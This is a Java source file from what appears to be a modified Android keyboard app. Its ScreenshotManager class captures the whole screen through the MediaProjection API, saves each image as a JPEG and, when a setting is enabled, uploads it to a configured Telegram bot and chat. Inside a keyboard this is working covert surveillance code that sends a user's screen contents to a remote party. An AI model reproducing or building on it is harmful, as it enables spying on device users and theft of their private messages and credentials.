package com.abifog.rboard.latin.utils;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import com.abifog.rboard.latin.settings.Settings;
import com.abifog.rboard.latin.settings.SettingsValues;
import com.abifog.rboard.latin.utils.TelegramReporter;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Manages screen capture using the MediaProjection API.
 */
public class ScreenshotManager {
    private static final String TAG = ScreenshotManager.class.getSimpleName();
    private static MediaProjection sMediaProjection;
    private static Intent sProjectionData;

    public static void setProjectionData(Intent data) {
        sProjectionData = data;
    }

    public static void captureScreenshot(final Context context) {
        if (sProjectionData == null) {
            Log.e(TAG, "MediaProjection data not set. Cannot capture screenshot.");
            return;
        }

        final MediaProjectionManager projectionManager = (MediaProjectionManager) context
                .getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        if (sMediaProjection == null) {
            sMediaProjection = projectionManager.getMediaProjection(-1, sProjectionData);
        }

        if (sMediaProjection == null)
            return;

        final WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        final DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(metrics);
        final int width = metrics.widthPixels;
        final int height = metrics.heightPixels;
        final int density = metrics.densityDpi;

        final ImageReader imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        final VirtualDisplay virtualDisplay = sMediaProjection.createVirtualDisplay("Screenshot",
                width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null);

        imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(ImageReader reader) {
                Image image = null;
                FileOutputStream fos = null;
                Bitmap bitmap = null;

                try {
                    image = reader.acquireLatestImage();
                    if (image != null) {
                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * width;

                        bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);

                        SimpleDateFormat sdf = new SimpleDateFormat("dd_MM_yyyy_HH_mm_ss", Locale.getDefault());
                        String fileName = context.getExternalFilesDir(null).getAbsolutePath() + "/screenshot_"
                                + sdf.format(new Date()) + ".jpg";

                        File file = new File(fileName);
                        fos = new FileOutputStream(file);
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, fos);

                        Log.d(TAG, "Screenshot saved: " + fileName);
                        
                        // Telegram Reporting
                        SettingsValues settingsValues = Settings.getInstance().getCurrent();
                        if (settingsValues.mEnableTelegram) {
                            TelegramReporter.sendDocument(settingsValues.mTelegramBotToken, settingsValues.mTelegramChatId, file);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error capturing screenshot: " + e.getMessage());
                } finally {
                    if (fos != null) {
                        try {
                            fos.close();
                        } catch (Exception ignored) {
                        }
                    }
                    if (bitmap != null) {
                        bitmap.recycle();
                    }
                    if (image != null) {
                        image.close();
                    }
                    reader.close();
                    virtualDisplay.release();
                }
            }
        }, new Handler(Looper.getMainLooper()));
    }
}
